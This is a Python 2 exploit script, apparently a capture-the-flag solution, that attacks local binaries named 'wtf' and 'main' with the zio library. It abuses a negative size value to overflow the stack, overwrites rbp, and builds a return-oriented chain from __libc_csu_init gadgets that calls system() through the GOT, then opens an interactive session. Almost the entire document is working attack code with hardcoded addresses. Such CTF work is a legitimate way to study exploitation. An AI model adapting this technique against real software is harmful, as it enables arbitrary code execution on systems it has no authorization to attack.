from zio import *
target = "./wtf"

def get_io(target):
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
	return io

def pwn2(io, index):
	payload = "ccc" + 'a' + 'a'*index + "\n"
	len_t = len(payload)
	len_index = 0
	while len_index < len_t:
		len_e = 5000 + len_index
		if len_e > len_t:
			len_e = len_t
		print "len:", len(payload[len_index:len_e])
		io.write(payload[len_index:len_e])
		len_index = len_e
	io.write("\n")
	io.read_until("\n")
	data = io.read_until("\n")
	if data != "i:0\n":
		exit(0)

def pwn(io):
	size = "-10"
	rbp = l64(0x0101010101010101)
	padding = 'a' * (0x30) +  rbp

	read_got = l64(0x0000000000601010)
	system_got = l64(0x0000000000601008)
	puts_got = l64(0x0000000000601000)
	command = l64(0x00000000004007BC)

	set_args_addr = l64(0x0000000000400736)
	#+ 0 no use 
	#+ 8 rbx 0
	#+10 rbp 1 ;rbx + 1 = rbp (will call set_args_addr again)
	#+18 r12 func_addr(got)
	#+20 r14 arg1
	#+28 r13 arg2
	#+30 r15 arg3
	call_func_addr = l64(0x0000000000400720)
	
	shellcode = set_args_addr
	"""
	shellcode += l64(0x0) #no use
	shellcode += l64(0)	  #rbx 0
	shellcode += l64(1)	  #rbp 1
	shellcode += read_got #func_addr
	shellcode += l64(0x0) #arg1 0
	shellcode += read_got #arg2 buff
	shellcode += l64(0x8) #arg3 size
	shellcode += call_func_addr
	"""
	binsh_addr = read_got
	binsh_addr = command
	#after call will call set_args_addr again
	shellcode += l64(0x0) #no use
	shellcode += l64(0)	  #rbx 0
	shellcode += l64(1)	  #rbp 1
	shellcode += system_got #func_addr
	shellcode += binsh_addr #arg1 /bin/sh;
	shellcode += binsh_addr #arg2 no use
	shellcode += binsh_addr #arg3 no use
	shellcode += call_func_addr

	io.gdb_hint()
	#file_w  =open('exp.dat', 'w')
	#io.write(size + "\n")
	#file_w.write(size + "\n")

	payload = size + "a" * 3999 + padding + shellcode + "\n" + "/bin/ls\x00\n" + 'a' * 1024 + "\n"
	
	print payload.encode("hex")
	#file_w.write(payload)
	#file_w.close()

	io.write(payload)
	io.interact()
"""
io = get_io(target)
pwn(io)
exit(0)
"""
index = 0
while index < 1:
	print "index:", index
	target = "./main"
	io = get_io(target)
	pwn2(io, index)
	index += 1	
